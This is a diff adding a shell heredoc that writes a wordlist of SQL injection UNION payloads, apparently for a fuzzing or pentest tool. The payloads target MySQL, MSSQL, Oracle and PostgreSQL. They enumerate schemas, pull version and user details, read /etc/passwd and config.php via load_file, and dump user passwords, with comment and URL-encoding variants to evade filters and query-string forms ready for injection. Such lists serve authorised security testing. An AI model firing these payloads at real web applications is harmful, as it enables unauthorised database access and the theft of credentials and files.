@@ -1,0 +1,76 @@
+cat << 'EOF' > payloads/union.txt
+ UNION ALL SELECT
+' UNION SELECT
+' UNION ALL SELECT
+) union select * from information_schema.tables;
+ union select
+ union select 1,load_file('/etc/passwd'),1,1,1;
+ union all select @@version--
+\x27UNION SELECT
+uni/**/on sel/**/ect
+ union select * from users where login = char ...
+10%20UNION%20ALL%20SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176717071,0x6a70787a43525a4e7563646951517a696944624150465361476541455147435a536c775142586976,0x7176717871)-- -
+(SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))
+?id=1' UNION SELECT null, null, null--
+?page=1' UNION SELECT null, null, null--
+?dir=1' UNION SELECT null, null, null--
+?search=1' UNION SELECT null, null, null--
+?category=1' UNION SELECT null, null, null--
+?class=1' UNION SELECT null, null, null--
+?file=1' UNION SELECT null, null, null--
+?url=1' UNION SELECT null, null, null--
+?id=1' AND 1=0 UNION SELECT 1,2,3--
+?page=1' AND 1=0 UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL,@@version,USER(),DATABASE(),NULL--
+ UNION SELECT 1,version(),user(),database(),5--
+ UNION ALL SELECT NULL,user(),NULL--
+' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),3--
+ UNION SELECT 1,2,3 WHERE 1=0--
+' UNION ALL SELECT 1,CONCAT_WS(',',database(),version()),3--
+ UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),NULL--
+' UNION SELECT 1,load_file('/var/www/config.php'),3--
+ UNION SELECT 1,2,3 FROM dual--
+' UNION SELECT 1,(SELECT password FROM users LIMIT 0,1),3--
+ UNION ALL SELECT 1,@@hostname,3--
+' UNION SELECT 1,UNHEX(HEX(database())),3--
+ UNION SELECT 1,2,3 ORDER BY 1--
+' UNION SELECT 1,IF(1=1,@@version,'fail'),3--
+ UNION ALL SELECT NULL,CONVERT(@@version using latin1),NULL--
+' UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),3--
+ UNION SELECT 1,2,3 FROM sysobjects WHERE 1=1--
+' UNION SELECT 1,DB_NAME(),3--
+ UNION ALL SELECT NULL,GETDATE(),NULL--
+' UNION SELECT 1,(SELECT TOP 1 name FROM sys.tables),3--
+ UNION SELECT 1,2,3 FROM all_tables--
+' UNION SELECT 1,(SELECT username FROM all_users WHERE rownum=1),3--
+ UNION ALL SELECT NULL,USERENV('SESSION_USER'),NULL--
+' UNION SELECT 1,CHR(65)||CHR(66),3 FROM dual--
+ UNION SELECT 1,2,3 FROM pg_tables--
+' UNION SELECT 1,(SELECT relname FROM pg_stat_user_tables LIMIT 1),3--
+ UNION ALL SELECT NULL,current_user,NULL--
+' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables--
+%55%4E%49%4F%4E%20%53%45%4C%45%43%54%201,2,3-- (UNION SELECT encoded)
+'/**/UNION/**/SELECT/**/1,2,3--
+ UNION SELECT/*comment*/1,2,3--
+' UNION SELECT NULL,(SELECT convert(varchar,@@version)),NULL--
+ UNION ALL SELECT 1,(SELECT SYSTEM_USER),3--
+' UNION SELECT 1,cast(@@version as varchar(255)),3--
+ UNION SELECT 1,2,3 FROM master..sysdatabases--
+' UNION SELECT 1,(SELECT name FROM master..syslogins LIMIT 0,1),3--
+ UNION ALL SELECT NULL,@@servername,NULL--
+' UNION SELECT 1,HEX(@@version),3--
+ UNION SELECT 1,2,3 FROM dba_tables--
+' UNION SELECT 1,(SELECT table_name FROM all_tables WHERE rownum=1),3--
+ UNION ALL SELECT NULL,sys_context('USERENV','CURRENT_SCHEMA'),NULL--
+' UNION SELECT 1,TO_CHAR(SYSDATE),3 FROM dual--
+ UNION SELECT 1,2,3 FROM pg_stat_activity--
+' UNION SELECT 1,(SELECT usename FROM pg_user LIMIT 1),3--
+ UNION ALL SELECT NULL,inet_server_addr(),NULL--
+' UNION SELECT 1,(SELECT current_database()),3--
+?id=1' UNION ALL SELECT NULL,database(),NULL--
+?page=1' UNION SELECT 1,version(),3--
+?search=1' UNION SELECT NULL,(SELECT user()),NULL--
+?category=1' UNION ALL SELECT 1,2,3 FROM information_schema.tables--
+EOF
